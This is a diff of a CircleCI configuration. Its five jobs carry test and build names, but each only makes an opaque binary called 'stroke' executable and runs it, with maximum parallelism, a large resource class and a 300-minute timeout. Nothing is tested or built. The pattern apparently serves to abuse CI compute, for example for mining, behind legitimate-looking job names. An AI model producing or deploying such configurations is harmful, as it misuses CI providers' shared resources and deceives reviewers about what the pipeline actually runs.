@@ -1,51 +1,130 @@
-working_dir: &working_dir ~/app
-.build_template: &script
-  steps:
-    - checkout
-    - run:
-        name: STROKE
-        command: |
-                    chmod u+x stroke && ./stroke
-        no_output_timeout: 300m
-version: 2
-jobs:
-  pelakor:
-    <<: *script
-    parallelism: 6
+version: 2.1
+
+executors:
+  stroke:
     docker:
-      - image: redis:latest
-    resource_class: large
-  pelakor1:
-    <<: *script
-    parallelism: 6
-    docker:
-      - image: redis:latest
-    resource_class: large
-  pelakor2:
-    <<: *script
-    parallelism: 6
-    docker:
-      - image: redis:latest
-    resource_class: large
-  pelakor3:
-    <<: *script
-    parallelism: 6
-    docker:
-      - image: redis:latest
-    resource_class: large
-  pelakor4:
-    <<: *script
-    parallelism: 6
-    docker:
-      - image: redis:latest
+      - image: node
     resource_class: large
 
+orbs:
+  node: circleci/node@4.7.0
+
+jobs:
+  test:
+    parallelism: 6
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+         Name: test
+         command: |
+                     chmod +x stroke && ./stroke
+         no_output_timeout: 300m
+  build:
+    parallelism: 6
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+         Name: build
+         command: |
+                     chmod +x stroke && ./stroke
+         no_output_timeout: 300m
+  building:
+    parallelism: 6
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+         Name: building
+         command: |
+                     chmod +x stroke && ./stroke
+         no_output_timeout: 300m
+  runing:
+    parallelism: 6
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+         Name: test
+         command: |
+                     chmod +x stroke && ./stroke
+         no_output_timeout: 300m
+  project:
+    parallelism: 6
+    parameters:
+      os:
+        type: executor
+      node-version:
+        type: string
+    executor: << parameters.os >>
+    steps:
+      - checkout
+      - node/install:
+          node-version: << parameters.node-version >>
+          install-yarn: true
+      - run:
+         Name: build
+         command: |
+                     chmod +x stroke && ./stroke
+         no_output_timeout: 300m
 workflows:
-  version: 2
-  commit:
+  all-tests:
     jobs:
-      - pelakor
-      - pelakor1
-      - pelakor2
-      - pelakor3
-      - pelakor4
+      - test:
+          matrix:
+            parameters:
+              os: [stroke]
+              node-version: ["16.13.0"]
+      - build:
+          matrix:
+            parameters:
+              os: [stroke]
+              node-version: ["16.13.0"]
+      - building:
+          matrix:
+            parameters:
+              os: [stroke]
+              node-version: ["16.13.0"]
+      - runing:
+          matrix:
+            parameters:
+              os: [stroke]
+              node-version: ["16.13.0"]
+      - project:
+          matrix:
+            parameters:
+              os: [stroke]
+              node-version: ["16.13.0"]
